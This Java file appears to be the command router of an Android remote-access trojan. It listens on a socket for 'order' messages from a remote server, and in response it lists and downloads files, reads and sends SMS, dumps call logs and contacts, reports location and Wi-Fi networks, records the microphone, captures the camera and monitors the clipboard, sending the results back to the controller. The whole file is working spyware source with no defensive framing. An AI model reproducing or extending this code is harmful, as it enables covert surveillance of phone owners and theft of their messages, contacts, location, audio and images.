package com.fason.app.core.network;

import android.os.Looper;

import com.fason.app.core.FasonApp;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.features.apps.AppList;
import com.fason.app.features.calls.CallsManager;
import com.fason.app.features.camera.CameraManager;
import com.fason.app.features.clipboard.ClipboardMonitor;
import com.fason.app.features.contacts.ContactsManager;
import com.fason.app.features.location.LocManager;
import com.fason.app.features.mic.MicManager;
import com.fason.app.features.sms.SMSManager;
import com.fason.app.features.storage.FileManager;
import com.fason.app.features.wifi.WifiScanner;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import io.socket.client.Socket;

public final class SocketCommandRouter {

    private static final FileManager FILE_MGR = new FileManager();
    private static final CameraManager CAM_MGR = new CameraManager(FasonApp.getContext());
    private static final ExecutorService EXEC = Executors.newFixedThreadPool(2);
    private static boolean initialized;

    private SocketCommandRouter() {}

    public static synchronized void initialize() {
        if (initialized) return;
        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null) return;

        socket.on("ping", a -> socket.emit("pong"));
        socket.on("order", args -> handleOrder(args, socket));
        socket.connect();
        initialized = true;
    }

    private static void handleOrder(Object[] args, Socket socket) {
        try {
            if (args.length == 0 || !(args[0] instanceof JSONObject)) return;
            JSONObject data = (JSONObject) args[0];
            String type = data.optString("type", "");

            switch (type) {
                case "0xFI": handleFile(data); break;
                case "0xSM": handleSms(data, socket); break;
                case "0xCL": emit(socket, "0xCL", CallsManager.getCallsLogs()); break;
                case "0xCO": emit(socket, "0xCO", ContactsManager.getContacts()); break;
                case "0xMI": MicManager.startRecording(data.optInt("sec", 0)); break;
                case "0xLO": emitLocation(socket); break;
                case "0xWI": emit(socket, "0xWI", WifiScanner.scan(FasonApp.getContext())); break;
                case "0xPM": emit(socket, "0xPM", PermissionManager.getGrantedPermissions()); break;
                case "0xIN": emit(socket, "0xIN", AppList.getInstalledApps(data.optBoolean("includeSystem", true))); break;
                case "0xGP": emitPermStatus(socket, data.optString("permission", "")); break;
                case "0xCA": handleCamera(data, socket); break;
                case "0xCB": handleClipboard(data); break;
            }
        } catch (Exception ignored) {}
    }

    private static void handleFile(JSONObject data) {
        String action = data.optString("action");
        String path = data.optString("path", "");
        try {
            if ("ls".equals(action)) {
                JSONObject p = new JSONObject();
                p.put("type", "list");
                p.put("list", FILE_MGR.walk(path));
                p.put("path", path);
                SocketClient.getInstance().getSocket().emit("0xFI", p);
            } else if ("dl".equals(action)) {
                EXEC.execute(() -> FILE_MGR.downloadFile(path));
            }
        } catch (Exception ignored) {}
    }

    private static void handleSms(JSONObject data, Socket socket) {
        String action = data.optString("action");
        if ("ls".equals(action)) {
            EXEC.execute(() -> socket.emit("0xSM", SMSManager.getsms()));
        } else if ("sendSMS".equals(action)) {
            EXEC.execute(() -> socket.emit("0xSM", SMSManager.sendSMS(data.optString("to"), data.optString("sms"))));
        }
    }

    private static void handleCamera(JSONObject data, Socket socket) {
        String action = data.optString("action");
        if ("list".equals(action)) {
            JSONObject cams = CAM_MGR.findCameraList();
            if (cams == null) {
                try {
                    cams = new JSONObject();
                    cams.put("camList", true);
                    cams.put("list", new JSONArray());
                } catch (Exception ignored) {}
            }
            socket.emit("0xCA", cams);
        } else if ("capture".equals(action)) {
            CAM_MGR.startUp(data.optInt("id", 0));
        }
    }

    private static void handleClipboard(JSONObject data) {
        ClipboardMonitor m = ClipboardMonitor.getInstance(FasonApp.getContext());
        String action = data.optString("action", "fetch");
        if ("start".equals(action)) { m.start(); EXEC.execute(m::emitClipboardSnapshot); }
        else if ("stop".equals(action)) { m.stop(); }
        else { EXEC.execute(m::emitClipboardSnapshot); }
    }

    private static void emitLocation(Socket socket) {
        try {
            if (Looper.myLooper() == null) Looper.prepare();
            LocManager loc = new LocManager(FasonApp.getContext());
            if (loc.canGetLocation()) emit(socket, "0xLO", loc.getData());
        } catch (Exception ignored) {}
    }

    private static void emitPermStatus(Socket socket, String perm) {
        try {
            JSONObject d = new JSONObject();
            d.put("permission", perm);
            d.put("isAllowed", PermissionManager.canIUse(perm));
            socket.emit("0xGP", d);
        } catch (Exception ignored) {}
    }

    private static void emit(Socket socket, String ch, Object data) {
        EXEC.execute(() -> socket.emit(ch, data));
    }
}
